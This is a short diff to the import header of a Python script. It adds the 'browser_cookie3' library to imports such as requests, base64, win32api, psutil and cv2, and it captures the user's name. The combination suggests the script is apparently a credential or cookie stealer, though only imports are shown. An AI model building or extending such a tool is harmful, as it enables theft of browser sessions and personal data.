@@ -1,4 +1,4 @@
-import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes, uuid, cv2, processplatform
+import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes, uuid, cv2, processplatform, browser_cookie3
 import getpass;user=getpass.getuser()
 from json import loads
 from time import sleep
